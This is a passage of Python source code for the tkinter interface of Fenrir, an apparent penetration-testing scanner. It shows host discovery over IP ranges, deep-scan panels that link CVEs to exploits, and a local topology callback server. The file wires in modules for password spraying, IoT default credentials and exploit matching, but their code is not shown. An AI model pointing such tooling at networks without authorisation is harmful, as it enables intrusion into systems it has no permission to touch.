# fenrir/fenrir_gui.py
#
# Fenrir GUI — complete rewrite adding:
#   - Debug tab: per-module timing, memory usage, live status table
#   - Results tabs: Ports, Vulnerabilities, Exploits, Recon, Threats
#   - Search bar across all results tabs
#   - Memory guard: asyncio.Semaphore limiting concurrent heavy modules
#   - Per-module timeout wrapper (configurable, default 300s)
#   - Offline CVE results shown in Vulnerabilities tab
#   - Exploit↔CVE cross-linking in Exploits tab
#   - Scan populated directly into results tabs on completion

import asyncio
import json
import logging
import os
import queue
import re
import threading
import time
import tkinter as tk
from datetime import datetime, timedelta
from pathlib import Path
from tkinter import filedialog, messagebox, scrolledtext, ttk
from typing import Optional

try:
    from PIL import Image, ImageDraw, ImageTk
    PIL_OK = True
except ImportError:
    PIL_OK = False

from .branding_config import branding
from .config import config
from .epss_client import enrich_cves_with_epss, get_epss
from .fenrir_paths import make_result_dir, ASSETS_DIR, RESULTS_DIR, FENRIR_ROOT
from .logging_config import get_logger, setup_logging
from .modules import (
    MODULE_REGISTRY,
    DEFAULT_PORTS,
    WEB_PORTS,
    SSH_PORT,
    parse_ports,
    PortScanner,
    VulnerabilityScanner,
    WebScanner,
    DirBruteForcer,
    TechDetector,
    SubdomainScanner,
    DnsScanner,
    WhoisScanner,
    OsintScanner,
    ThreatIntelScanner,
    ExploitScanner,
    PasswordSprayer,
    IotScanner,
    OtScanner,
    MobileScanner,
    AndroidScanner,
    NetworkScanner,
    RfScanner,
)
from .report_manager import ReportManager
from .scan_history import get_scan_history

log = get_logger()

# ── Colour palette — driven by branding.json, editable at runtime ──────────────
def _reload_palette() -> None:
    """Pull live colours from branding config into module globals."""
    global DARK_BG, PANEL_BG, ACCENT, TEXT_FG, WARN_FG, ERR_FG
    global SUCCESS_FG, ENTRY_BG, SEP_FG, BTN_ACTIVE, CRIT_FG, DEBUG_FG
    global TIMING_OK, TIMING_SLOW, TIMING_BAD
    DARK_BG    = branding.dark_bg
    PANEL_BG   = branding.panel_bg
    ACCENT     = branding.accent_colour
    TEXT_FG    = branding.text_fg
    WARN_FG    = branding.get("warn_fg",    "#f9e2af")
    ERR_FG     = branding.get("err_fg",     "#f38ba8")
    SUCCESS_FG = branding.get("success_fg", "#a6e3a1")
    ENTRY_BG   = branding.entry_bg
    SEP_FG     = branding.get("sep_fg",     "#45475a")
    BTN_ACTIVE = branding.get("btn_active", "#585b70")
    CRIT_FG    = branding.get("crit_fg",    "#ff5555")
    DEBUG_FG   = branding.get("debug_fg",   "#6272a4")
    TIMING_OK  = SUCCESS_FG
    TIMING_SLOW= WARN_FG
    TIMING_BAD = ERR_FG

_reload_palette()   # initialise on import

# Per-module soft timeout (seconds).  Heavy modules get more time.
MODULE_TIMEOUTS = {
    "port_scan":      120,
    "vuln_scan":      300,
    "web_scan":        90,
    "dir_brute":      180,
    "tech_detect":     60,
    "subdomain_scan": 120,
    "dns_scan":        60,
    "whois_scan":      30,
    "osint_scan":     120,
    "threat_intel":    90,
    "exploit_search":  60,
    "pass_spray":     180,
    "iot_scan":       120,
    "ot_scan":        120,
    "mobile_scan":     60,
    "rf_scan":        120,
}

# Maximum concurrent "heavy" modules (those that can spike RAM).
HEAVY_MODULES    = {"vuln_scan", "dir_brute", "subdomain_scan", "osint_scan",
                    "pass_spray", "ot_scan"}
MAX_CONCURRENT_HEAVY = 2


class FenrirGUI(tk.Tk):
    """Main Fenrir GUI application window."""

    def __init__(self) -> None:
        super().__init__()
        self.title(branding.window_title)
        self.geometry("1300x860")
        self.minsize(1024, 700)
        self.configure(bg=DARK_BG)

        # Background opacity slider var (before _build_ui)
        self._bg_opacity_var = tk.DoubleVar(value=branding.bg_opacity)

        # Asset paths from branding config
        self._asset = {
            "icon":       str(branding.logo_path or ""),
            "logo":       str(branding.logo_path or ""),
            "background": str(branding.background_path or ""),
        }

        # Log queue — scanner thread → GUI
        self.log_queue: queue.Queue = queue.Queue()
        setup_logging(log_level=logging.DEBUG, log_queue=self.log_queue)

        # Scan state
        self._scan_thread:  Optional[threading.Thread] = None
        self._cancel_event: threading.Event = threading.Event()
        self._scan_start:   Optional[float] = None

        # Debug/timing data
        self._module_timings: dict[str, dict] = {}
        self._timing_queue:   queue.Queue = queue.Queue()

        # Report/history
        self._last_report:    Optional[ReportManager] = None
        self._exploit_findings: dict[str, dict] = {}
        self._history = get_scan_history()
        self._current_scan_id: int = -1

        # Network scan state
        self._net_scan_thread:  Optional[threading.Thread] = None
        self._net_cancel_event: threading.Event = threading.Event()
        self._net_host_rows:    dict[str, str] = {}

        # Scheduled scan checker
        self._schedule_job: Optional[str] = None

        self._apply_styles()
        self._set_icon()
        self._build_ui()
        self._build_status_bar()
        self._poll_log_queue()
        self._poll_timing_queue()
        self._tick_status()
        self._check_schedules()        # start schedule polling
        self.protocol("WM_DELETE_WINDOW", self._on_closing)

    # =========================================================================
    # Styles
    # =========================================================================

    def _apply_styles(self) -> None:
        s = ttk.Style(self)
        try:
            s.theme_use("clam")
        except tk.TclError:
            pass

        s.configure(".",              background=DARK_BG,   foreground=TEXT_FG,
                     fieldbackground=ENTRY_BG, borderwidth=1, relief="flat",
                     font=("Helvetica", 9))
        s.configure("TFrame",         background=PANEL_BG)
        s.configure("TLabelframe",    background=PANEL_BG, bordercolor=SEP_FG,
                     relief="flat")
        s.configure("TLabelframe.Label", background=PANEL_BG, foreground=ACCENT,
                     font=("Helvetica", 9, "bold"))
        s.configure("TCheckbutton",   background=PANEL_BG, foreground=TEXT_FG)
        s.map("TCheckbutton",         background=[("active", PANEL_BG)])
        s.configure("TEntry",         fieldbackground=ENTRY_BG, foreground=TEXT_FG,
                     insertcolor=TEXT_FG)
        s.configure("TCombobox",      fieldbackground=ENTRY_BG, foreground=TEXT_FG,
                     selectbackground=ENTRY_BG)
        s.configure("TSpinbox",       fieldbackground=ENTRY_BG, foreground=TEXT_FG)
        s.configure("TButton",        background=ENTRY_BG, foreground=TEXT_FG,
                     padding=(6, 3))
        s.map("TButton",              background=[("active", BTN_ACTIVE)])
        s.configure("Accent.TButton", background=ACCENT,   foreground=DARK_BG,
                     font=("Helvetica", 9, "bold"), padding=(6, 4))
        s.map("Accent.TButton",       background=[("active", "#7aa2f7")])
        s.configure("Stop.TButton",   background="#45475a", foreground=ERR_FG)
        s.map("Stop.TButton",         background=[("active", "#585b70")])
        s.configure("TLabel",         background=PANEL_BG, foreground=TEXT_FG)
        s.configure("TScrollbar",     background=ENTRY_BG, troughcolor=DARK_BG,
                     arrowcolor=TEXT_FG)
        s.configure("TProgressbar",   background=ACCENT, troughcolor=ENTRY_BG)
        s.configure("Separator.TFrame", background=SEP_FG)
        s.configure("TNotebook",      background=DARK_BG, tabmargins=[0, 0, 0, 0])
        s.configure("TNotebook.Tab",
                     background=ENTRY_BG, foreground=TEXT_FG, padding=(10, 4),
                     font=("Helvetica", 9))
        s.map("TNotebook.Tab",
              background=[("selected", PANEL_BG)],
              foreground=[("selected", ACCENT)])
        s.configure("Treeview",       background=ENTRY_BG, foreground=TEXT_FG,
                     fieldbackground=ENTRY_BG, rowheight=22, borderwidth=0)
        s.configure("Treeview.Heading", background=PANEL_BG, foreground=ACCENT,
                     relief="flat", font=("Helvetica", 9, "bold"))
        s.map("Treeview",             background=[("selected", ACCENT)],
              foreground=[("selected", DARK_BG)])

    # =========================================================================
    # Icon
    # =========================================================================

    def _set_icon(self) -> None:
        logo_path = branding.logo_path
        try:
            if logo_path and logo_path.exists():
                icon = Image.open(logo_path).resize((32, 32), Image.Resampling.LANCZOS)
            else:
                icon = _make_wolf_icon(32)
            self._icon_img = ImageTk.PhotoImage(icon)
            self.iconphoto(True, self._icon_img)
        except Exception:
            pass

    # =========================================================================
    # UI construction
    # =========================================================================

    def _build_ui(self) -> None:
        # ── Background canvas — drawn directly on root, sits behind everything ──
        self._bg_canvas = tk.Canvas(self, highlightthickness=0, bd=0)
        self._bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        # Schedule background draw after window is mapped so winfo_width is valid
        self.after(50, self._update_background)
        self.bind("<Configure>", lambda e: self.after(10, self._update_background))

        # ── Branding header strip ──────────────────────────────────────────────
        self._build_header_strip()

        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True, padx=6, pady=(0, 0))

        # ── Scan ──────────────────────────────────────────────────────────────
        scan_tab = ttk.Frame(notebook)
        notebook.add(scan_tab, text="  Scan  ")
        self._build_scan_tab(scan_tab)

        # ── Network Scan ───────────────────────────────────────────────────────
        net_tab = ttk.Frame(notebook)
        notebook.add(net_tab, text="  Network Scan  ")
        self._build_network_tab(net_tab)

        # ── Results ────────────────────────────────────────────────────────────
        self._results_tab = ttk.Frame(notebook)
        notebook.add(self._results_tab, text="  Results  ")
        self._build_results_tab(self._results_tab)

        # ── History ────────────────────────────────────────────────────────────
        hist_tab = ttk.Frame(notebook)
        notebook.add(hist_tab, text="  History  ")
        self._build_history_tab(hist_tab)

        # ── Schedules ──────────────────────────────────────────────────────────
        sched_tab = ttk.Frame(notebook)
        notebook.add(sched_tab, text="  Schedules  ")
        self._build_schedules_tab(sched_tab)

        # ── Debug ──────────────────────────────────────────────────────────────
        debug_tab = ttk.Frame(notebook)
        notebook.add(debug_tab, text="  Debug  ")
        self._build_debug_tab(debug_tab)

        # ── Database ───────────────────────────────────────────────────────────
        db_tab = ttk.Frame(notebook)
        notebook.add(db_tab, text="  Database  ")
        self._build_db_tab(db_tab)

        self._root_notebook = notebook

    # ─── Network Discovery + Deep Scan tab ───────────────────────────────────

    def _build_network_tab(self, parent: ttk.Frame) -> None:
        """
        Two-stage network tab:
          Panel 1 — Discovery: fast sweep to find live hosts, TTL OS guess,
                    quick port probe for device classification.
          Panel 2 — Deep Scan: select one or more discovered hosts, choose
                    modules, run full port scan + CVE + exploit assessment.
        """
        parent.columnconfigure(0, weight=1)
        parent.rowconfigure(0, weight=1)

        paned = ttk.PanedWindow(parent, orient=tk.VERTICAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=6, pady=6)

        # ═══════════════════════════════════════════════════════════════════
        # TOP PANEL — Network Discovery
        # ═══════════════════════════════════════════════════════════════════
        disc_frame = ttk.LabelFrame(paned, text="① Network Discovery", padding=8)
        paned.add(disc_frame, weight=2)
        disc_frame.columnconfigure(0, weight=1)
        disc_frame.rowconfigure(2, weight=1)   # row 2 = treeview (expands)

        # Row 0 — target entry + timeout + buttons (all on one line)
        r0 = ttk.Frame(disc_frame)
        r0.grid(row=0, column=0, sticky="ew", pady=(0, 2))
        r0.columnconfigure(1, weight=1)

        ttk.Label(r0, text="Target range:").grid(row=0, column=0, sticky="w", padx=(0, 6))
        self._net_targets_var = tk.StringVar(value="192.168.1.0/24")
        ttk.Entry(r0, textvariable=self._net_targets_var).grid(
            row=0, column=1, sticky="ew", padx=(0, 8))
        ttk.Label(r0, text="Timeout (s):").grid(row=0, column=2, sticky="w", padx=(0, 4))
        self._net_disc_timeout_var = tk.DoubleVar(value=1.5)
        ttk.Spinbox(r0, from_=0.5, to=10.0, increment=0.5, width=5,
                    textvariable=self._net_disc_timeout_var).grid(
                    row=0, column=3, padx=(0, 8))
        self._disc_btn = ttk.Button(r0, text="Discover Hosts",
                                     style="Accent.TButton",
                                     command=self._start_discovery)
        self._disc_btn.grid(row=0, column=4, padx=(0, 4))
        self._disc_stop_btn = ttk.Button(r0, text="Stop",
                                          style="Stop.TButton", state="disabled",
                                          command=self._stop_discovery)
        self._disc_stop_btn.grid(row=0, column=5, padx=(0, 4))
        self._disc_status = tk.Label(r0, text="Idle", bg=PANEL_BG,
                                      fg=DEBUG_FG, font=("Helvetica", 9))
        self._disc_status.grid(row=0, column=6, sticky="w", padx=(4, 0))

        # Row 1 — hint text (separate row, no overlap)
        tk.Label(disc_frame,
                 text="Accepts: 192.168.1.0/24  ·  10.0.0.1-50  ·  192.168.1.5,10  ·  combinations",
                 bg=PANEL_BG, fg=DEBUG_FG, font=("Helvetica", 8)
                 ).grid(row=1, column=0, sticky="w", pady=(0, 4))

        # Row 2 — discovery results treeview
        disc_tbl = ttk.Frame(disc_frame)
        disc_tbl.grid(row=2, column=0, sticky="nsew")
        disc_tbl.columnconfigure(0, weight=1)
        disc_tbl.rowconfigure(0, weight=1)

        _disc_cols = ("sel", "ip", "hostname", "mac", "vendor",
                      "ttl", "os_family", "device_type", "quick_ports")
        self._disc_tree = ttk.Treeview(disc_tbl, columns=_disc_cols,
                                        show="headings", height=8,
                                        selectmode="extended")
        _disc_cfg = [
            ("sel",         "✓",            28,  tk.CENTER),
            ("ip",          "IP Address",   120, tk.W),
            ("hostname",    "Hostname",     150, tk.W),
            ("mac",         "MAC",          130, tk.W),
            ("vendor",      "Vendor",       110, tk.W),
            ("ttl",         "TTL",           38, tk.CENTER),
            ("os_family",   "OS (hint)",    115, tk.W),
            ("device_type", "Device type",  100, tk.CENTER),
            ("quick_ports", "Hint ports",   120, tk.W),
        ]
        for col, hdr, w, anchor in _disc_cfg:
            self._disc_tree.heading(col, text=hdr,
                                    command=lambda c=col: self._sort_disc_tree(c))
            self._disc_tree.column(col, width=w, anchor=anchor, minwidth=25)

        self._disc_tree.tag_configure("mobile",  foreground="#bb9af7")
        self._disc_tree.tag_configure("iot",     foreground="#e0af68")
        self._disc_tree.tag_configure("network", foreground="#7dcfff")
        self._disc_tree.tag_configure("server",  foreground=SUCCESS_FG)

        vsb_d = ttk.Scrollbar(disc_tbl, orient=tk.VERTICAL,
                               command=self._disc_tree.yview)
        hsb_d = ttk.Scrollbar(disc_tbl, orient=tk.HORIZONTAL,
                               command=self._disc_tree.xview)
        self._disc_tree.configure(yscrollcommand=vsb_d.set,
                                   xscrollcommand=hsb_d.set)
        self._disc_tree.grid(row=0, column=0, sticky="nsew")
        vsb_d.grid(row=0, column=1, sticky="ns")
        hsb_d.grid(row=1, column=0, sticky="ew")
        self._disc_tree.bind("<Button-1>", self._on_disc_row_click)

        # Row 3 — select buttons bar
        sel_bar = ttk.Frame(disc_frame)
        sel_bar.grid(row=3, column=0, sticky="w", pady=(4, 0))
        for txt, cmd in [
            ("Select All",     self._disc_select_all),
            ("Select None",    self._disc_select_none),
            ("Select Mobile",  lambda: self._disc_select_by_type("mobile")),
            ("Select IoT",     lambda: self._disc_select_by_type("iot")),
            ("Select Network", lambda: self._disc_select_by_type("network")),
            ("Select Servers", lambda: self._disc_select_by_type("server")),
        ]:
            ttk.Button(sel_bar, text=txt, command=cmd).pack(side=tk.LEFT, padx=2)
        self._disc_sel_label = tk.Label(sel_bar, text="0 selected",
                                         bg=PANEL_BG, fg=DEBUG_FG,
                                         font=("Helvetica", 9))
        self._disc_sel_label.pack(side=tk.LEFT, padx=12)

        # ═══════════════════════════════════════════════════════════════════
        # BOTTOM PANEL — Deep Scan of selected hosts
        # ═══════════════════════════════════════════════════════════════════
        deep_frame = ttk.LabelFrame(paned, text="② Deep Scan — selected hosts",
                                     padding=8)
        paned.add(deep_frame, weight=3)
        deep_frame.columnconfigure(0, weight=1)
        deep_frame.rowconfigure(2, weight=1)   # row 2 = results tree
        deep_frame.rowconfigure(3, weight=1)   # row 3 = detail notebook

        # Row 0 — module checkboxes
        mod_row = ttk.Frame(deep_frame)
        mod_row.grid(row=0, column=0, sticky="ew", pady=(0, 2))
        ttk.Label(mod_row, text="Modules:").pack(side=tk.LEFT, padx=(0, 6))
        self._net_mod_vars: dict[str, tk.BooleanVar] = {}
        for key, label, default in [
            ("port_scan", "Port Scan",      True),
            ("os",        "OS Fingerprint", True),
            ("vuln",      "CVE Lookup",     True),
            ("exploit",   "Exploit Match",  True),
            ("web",       "Web Recon",      False),
            ("iot",       "IoT Creds",      True),
            ("mobile",    "Mobile / ADB",   True),
        ]:
            v = tk.BooleanVar(value=default)
            self._net_mod_vars[key] = v
            ttk.Checkbutton(mod_row, text=label, variable=v).pack(
                side=tk.LEFT, padx=3)

        # Row 1 — options + buttons (all on one line, no overlap)
        opt_row = ttk.Frame(deep_frame)
        opt_row.grid(row=1, column=0, sticky="ew", pady=(0, 4))
        ttk.Label(opt_row, text="Ports (-p):").pack(side=tk.LEFT)
        self._net_ports_var = tk.StringVar(value="")
        ttk.Entry(opt_row, textvariable=self._net_ports_var, width=18).pack(
            side=tk.LEFT, padx=(4, 2))
        tk.Label(opt_row, text="(blank=top-1000)",
                 bg=PANEL_BG, fg=DEBUG_FG, font=("Helvetica", 8)
                 ).pack(side=tk.LEFT, padx=(0, 8))
        ttk.Label(opt_row, text="Concurrency:").pack(side=tk.LEFT)
        self._net_concurrency_var = tk.IntVar(value=3)
        ttk.Spinbox(opt_row, from_=1, to=10, width=4,
                    textvariable=self._net_concurrency_var).pack(
                    side=tk.LEFT, padx=(4, 8))
        ttk.Label(opt_row, text="Port timeout (s):").pack(side=tk.LEFT)
        self._net_port_timeout_var = tk.DoubleVar(value=1.5)
        ttk.Spinbox(opt_row, from_=0.5, to=10.0, increment=0.5, width=5,
                    textvariable=self._net_port_timeout_var).pack(
                    side=tk.LEFT, padx=(4, 8))
        ttk.Label(opt_row, text="Output dir:").pack(side=tk.LEFT)
        self._net_output_var = tk.StringVar(value=str(RESULTS_DIR))
        ttk.Entry(opt_row, textvariable=self._net_output_var, width=14).pack(
            side=tk.LEFT, padx=(4, 2))
        ttk.Button(opt_row, text="…",
                   command=lambda: self._net_output_var.set(
                       filedialog.askdirectory() or self._net_output_var.get())
                   ).pack(side=tk.LEFT, padx=(0, 8))
        self._net_scan_btn = ttk.Button(opt_row, text="▶ Deep Scan Selected",
                                         style="Accent.TButton",
                                         command=self._start_deep_scan)
        self._net_scan_btn.pack(side=tk.LEFT, padx=(0, 4))
        self._net_stop_btn = ttk.Button(opt_row, text="Stop",
                                         style="Stop.TButton", state="disabled",
                                         command=self._stop_net_scan)
        self._net_stop_btn.pack(side=tk.LEFT, padx=(0, 4))
        self._topology_btn = ttk.Button(opt_row, text="⬡ View Topology",
                                         state="disabled",
                                         command=self._show_topology)
        self._topology_btn.pack(side=tk.LEFT, padx=(0, 4))
        self._net_status_label = tk.Label(opt_row, text="Idle",
                                           bg=PANEL_BG, fg=DEBUG_FG,
                                           font=("Helvetica", 9))
        self._net_status_label.pack(side=tk.LEFT, padx=4)

        # Row 2 — deep scan results tree
        deep_tbl = ttk.Frame(deep_frame)
        deep_tbl.grid(row=2, column=0, sticky="nsew", pady=(0, 4))
        deep_tbl.columnconfigure(0, weight=1)
        deep_tbl.rowconfigure(0, weight=1)

        _host_cols = ("ip", "hostname", "os", "device_type",
                      "open_ports", "cve_count", "critical", "status")
        self._net_host_tree = ttk.Treeview(deep_tbl, columns=_host_cols,
                                            show="headings", height=7)
        for col, hdr, w, anchor in [
            ("ip",          "IP Address",   120, tk.W),
            ("hostname",    "Hostname",     150, tk.W),
            ("os",          "OS / Version", 190, tk.W),
            ("device_type", "Device Type",  100, tk.CENTER),
            ("open_ports",  "Ports",         55, tk.CENTER),
            ("cve_count",   "CVEs",          50, tk.CENTER),
            ("critical",    "Critical",      55, tk.CENTER),
            ("status",      "Status",        85, tk.CENTER),
        ]:
            self._net_host_tree.heading(col, text=hdr)
            self._net_host_tree.column(col, width=w, anchor=anchor, minwidth=35)

        self._net_host_tree.tag_configure("critical", foreground=ERR_FG)
        self._net_host_tree.tag_configure("high",     foreground=WARN_FG)
        self._net_host_tree.tag_configure("ok",       foreground=SUCCESS_FG)
        self._net_host_tree.tag_configure("scanning", foreground=ACCENT)

        vsb_h = ttk.Scrollbar(deep_tbl, orient=tk.VERTICAL,
                               command=self._net_host_tree.yview)
        hsb_h = ttk.Scrollbar(deep_tbl, orient=tk.HORIZONTAL,
                               command=self._net_host_tree.xview)
        self._net_host_tree.configure(yscrollcommand=vsb_h.set,
                                       xscrollcommand=hsb_h.set)
        self._net_host_tree.grid(row=0, column=0, sticky="nsew")
        vsb_h.grid(row=0, column=1, sticky="ns")
        hsb_h.grid(row=1, column=0, sticky="ew")
        self._net_host_tree.bind("<<TreeviewSelect>>", self._on_net_host_select)

        # Row 3 — per-host detail sub-notebook
        det_nb = ttk.Notebook(deep_frame)
        det_nb.grid(row=3, column=0, sticky="nsew", pady=(0, 0))

        for tab_name, attr, cols in [
            ("Services", "_net_svc_tree", [
                ("port","Port",65), ("service","Service",95),
                ("version","Version",155), ("banner","Banner",340)]),
            ("Vulnerabilities", "_net_vuln_tree", [
                ("cve_id","CVE ID",135), ("score","Score",50),
                ("severity","Severity",72), ("service","Service",105),
                ("description","Description",430)]),
            ("Exploits", "_net_exp_tree", [
                ("edb_id","EDB-ID",62), ("title","Title",290),
                ("type","Type",72), ("platform","Platform",72),
                ("cve_ids","CVE(s)",175)]),
        ]:
            tab = ttk.Frame(det_nb)
            det_nb.add(tab, text=tab_name)
            tab.columnconfigure(0, weight=1)
            tab.rowconfigure(0, weight=1)
            tree = ttk.Treeview(tab, columns=[c[0] for c in cols],
                                show="headings", height=4)
            for col, hdr, w in cols:
                tree.heading(col, text=hdr)
                tree.column(col, width=w, minwidth=28)
            if attr == "_net_vuln_tree":
                tree.tag_configure("CRITICAL", foreground=ERR_FG)
                tree.tag_configure("HIGH",     foreground=WARN_FG)
                tree.tag_configure("MEDIUM",   foreground="#e0af68")
            vsb = ttk.Scrollbar(tab, orient=tk.VERTICAL, command=tree.yview)
            hsb = ttk.Scrollbar(tab, orient=tk.HORIZONTAL, command=tree.xview)
            tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
            tree.grid(row=0, column=0, sticky="nsew")
            vsb.grid(row=0, column=1, sticky="ns")
            hsb.grid(row=1, column=0, sticky="ew")
            setattr(self, attr, tree)

        info_tab = ttk.Frame(det_nb)
        det_nb.add(info_tab, text="Device Info")
        info_tab.columnconfigure(0, weight=1)
        info_tab.rowconfigure(0, weight=1)
        self._net_info_text = tk.Text(
            info_tab, bg=ENTRY_BG, fg=TEXT_FG, font=("Courier", 9),
            relief="flat", wrap=tk.WORD, state="disabled")
        vsb5 = ttk.Scrollbar(info_tab, orient=tk.VERTICAL,
                              command=self._net_info_text.yview)
        self._net_info_text.configure(yscrollcommand=vsb5.set)
        self._net_info_text.grid(row=0, column=0, sticky="nsew")
        vsb5.grid(row=0, column=1, sticky="ns")

        # Internal state
        self._disc_tree_data: dict[str, dict] = {}
        self._disc_selected:  set[str]        = set()
        self._net_host_data:  dict[str, dict] = {}
        self._net_host_rows:  dict[str, str]  = {}

    # ─── Discovery control ────────────────────────────────────────────────────

    def _start_discovery(self) -> None:
        targets = self._net_targets_var.get().strip()
        if not targets:
            messagebox.showerror("Network Discovery", "Enter a target range.")
            return
        if self._net_scan_thread and self._net_scan_thread.is_alive():
            messagebox.showwarning("Busy", "A scan is already running.")
            return

        self._disc_tree.delete(*self._disc_tree.get_children())
        self._disc_tree_data.clear()
        self._disc_selected.clear()
        self._net_cancel_event.clear()
        self._disc_btn.configure(state="disabled")
        self._disc_stop_btn.configure(state="normal")
        self._disc_status.configure(text="Discovering…", fg=ACCENT)
        self._disc_sel_label.configure(text="0 selected")

        timeout = self._net_disc_timeout_var.get()
        self._net_scan_thread = threading.Thread(
            target=self._run_discovery_thread,
            args=(targets, timeout),
            daemon=True,
        )
        self._net_scan_thread.start()

    def _stop_discovery(self) -> None:
        self._net_cancel_event.set()
        self._disc_stop_btn.configure(state="disabled")
        self._disc_status.configure(text="Stopping…", fg=WARN_FG)

    def _run_discovery_thread(self, targets: str, timeout: float) -> None:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._run_discovery_async(targets, timeout))
        except Exception as exc:
            log.error(f"Discovery thread error: {exc}")
        finally:
            self.after(0, self._on_discovery_done)

    async def _run_discovery_async(self, targets: str, timeout: float) -> None:
        if NetworkScanner is None:
            log.error("NetworkScanner not available.")
            return

        def _cb(done: int, total: int, ip: str, host_dict: dict = None) -> None:
            if host_dict:
                self.after(0, lambda h=host_dict: self._on_discovered_host(h))
            self.after(0, lambda d=done, t=total, i=ip:
                       self._disc_status.configure(
                           text=f"Found {d}/{t}: {i}", fg=ACCENT))

        scanner = NetworkScanner()
        results = await scanner.discover_hosts(
            targets,
            port_timeout=timeout,
            progress_callback=_cb,
            cancel_event=self._net_cancel_event,
        )
        # Any hosts returned but not yet sent via callback (edge case)
        for h in results:
            ip = h.get("ip", "")
            if ip and ip not in self._disc_tree_data:
                self.after(0, lambda hh=h: self._on_discovered_host(hh))

    def _on_discovered_host(self, host: dict) -> None:
        ip          = host.get("ip", "?")
        hostname    = host.get("hostname", "")
        mac         = host.get("mac", "")
        vendor      = host.get("vendor", "")
        ttl         = host.get("ttl", "") or ""
        os_family   = host.get("os_family", "")
        device_type = host.get("device_type", "unknown")
        quick_ports = ", ".join(str(p) for p in host.get("open_ports", []))

        tag = {"mobile": "mobile", "iot": "iot",
               "network": "network", "server": "server"}.get(device_type, "")

        values = ("☐", ip, hostname, mac, vendor, ttl,
                  os_family, device_type, quick_ports)
        self._disc_tree.insert("", tk.END, iid=ip, values=values,
                                tags=(tag,) if tag else ())
        self._disc_tree_data[ip] = host
        self._disc_status.configure(
            text=f"{len(self._disc_tree_data)} host(s) found", fg=ACCENT)

    def _on_discovery_done(self) -> None:
        self._disc_btn.configure(state="normal")
        self._disc_stop_btn.configure(state="disabled")
        n = len(self._disc_tree_data)
        self._disc_status.configure(
            text=f"Done — {n} host(s). Tick rows then click 'Deep Scan Selected'.",
            fg=SUCCESS_FG if n else WARN_FG)

    def _on_disc_row_click(self, event) -> None:
        """Toggle checkbox on row click."""
        region = self._disc_tree.identify_region(event.x, event.y)
        if region not in ("cell", "tree"):
            return
        row_id = self._disc_tree.identify_row(event.y)
        if not row_id:
            return
        ip = row_id  # iid == ip
        if ip in self._disc_selected:
            self._disc_selected.discard(ip)
            vals = list(self._disc_tree.item(ip, "values"))
            vals[0] = "☐"
            self._disc_tree.item(ip, values=vals)
        else:
            self._disc_selected.add(ip)
            vals = list(self._disc_tree.item(ip, "values"))
            vals[0] = "☑"
            self._disc_tree.item(ip, values=vals)
        self._disc_sel_label.configure(
            text=f"{len(self._disc_selected)} selected")

    def _disc_select_all(self) -> None:
        for ip in self._disc_tree_data:
            self._disc_selected.add(ip)
            vals = list(self._disc_tree.item(ip, "values"))
            vals[0] = "☑"
            self._disc_tree.item(ip, values=vals)
        self._disc_sel_label.configure(text=f"{len(self._disc_selected)} selected")

    def _disc_select_none(self) -> None:
        for ip in list(self._disc_selected):
            vals = list(self._disc_tree.item(ip, "values"))
            vals[0] = "☐"
            self._disc_tree.item(ip, values=vals)
        self._disc_selected.clear()
        self._disc_sel_label.configure(text="0 selected")

    def _disc_select_by_type(self, device_type: str) -> None:
        for ip, host in self._disc_tree_data.items():
            if host.get("device_type") == device_type:
                self._disc_selected.add(ip)
                vals = list(self._disc_tree.item(ip, "values"))
                vals[0] = "☑"
                self._disc_tree.item(ip, values=vals)
        self._disc_sel_label.configure(text=f"{len(self._disc_selected)} selected")

    def _sort_disc_tree(self, col: str) -> None:
        rows = [(self._disc_tree.set(iid, col), iid)
                for iid in self._disc_tree.get_children("")]
        rows.sort(key=lambda x: x[0].lower())
        for idx, (_, iid) in enumerate(rows):
            self._disc_tree.move(iid, "", idx)

    def _show_topology(self) -> None:
        """Generate topology diagram and open it. Starts a local callback server
        so clicking a device in the browser triggers the Results tab in Fenrir."""
        if not self._net_host_data:
            messagebox.showinfo("No data", "Run a network scan first.")
            return

        try:
            from fenrir.network_diagram import generate_diagram
        except ImportError as exc:
            messagebox.showerror("Missing module", f"network_diagram.py not found:\n{exc}")
            return

        # ── Start a tiny localhost HTTP server to handle click callbacks ────────
        cb_port = self._start_topology_callback()

        hosts      = list(self._net_host_data.values())
        output_dir = self._net_output_var.get().strip() or str(RESULTS_DIR)
        diagram_path = Path(output_dir) / "network_topology.html"

        try:
            generate_diagram(
                hosts=hosts,
                output_path=diagram_path,
                scan_result_dir=output_dir,
                fenrir_callback_port=cb_port,
            )
            log.info(f"[topology] Diagram saved: {diagram_path}")
            import webbrowser
            webbrowser.open(diagram_path.as_uri())
        except Exception as exc:
            log.error(f"[topology] Generation failed: {exc}")
            messagebox.showerror("Diagram error", str(exc))

    def _start_topology_callback(self) -> int:
        """
        Start a one-shot localhost HTTP server that receives device-click events
        from the topology diagram browser page and routes them to the Results tab.
        Returns the port number, or 0 if unavailable.
        """
        import http.server, socketserver, threading, urllib.parse

        gui_ref = self

        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                params = urllib.parse.parse_qs(parsed.query)
                ip     = params.get("ip", [""])[0]
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"ok")
                if ip:
                    gui_ref.after(0, lambda i=ip: gui_ref._open_host_in_results(i))
            def log_message(self, *_): pass  # suppress server log noise

        try:
            server = socketserver.TCPServer(("127.0.0.1", 0), _Handler)
            server.allow_reuse_address = True
            port = server.server_address[1]
            t = threading.Thread(target=server.serve_forever, daemon=True)
            t.start()
            # Store so we can shut it down later
            if not hasattr(self, "_topology_servers"):
                self._topology_servers = []
            self._topology_servers.append(server)
            log.debug(f"[topology] Callback server on port {port}")
            return port
        except Exception as exc:
            log.debug(f"[topology] Callback server failed: {exc}")
            return 0

    def _open_host_in_results(self, ip: str) -> None:
        """Switch to Results tab and filter to the given host IP."""
        try:
            # Switch to the Results tab (index 2)
            self._root_notebook.select(2)
            # Try to highlight the host in the ports/vulns trees
            for tree in (self._ports_tree, self._vulns_tree):
                for iid in tree.get_children():
                    vals = tree.item(iid, "values")
                    if vals and str(vals[0]).startswith(ip):
                        tree.selection_set(iid)
                        tree.see(iid)
                        break
            log.info(f"[topology] Opened results for {ip}")
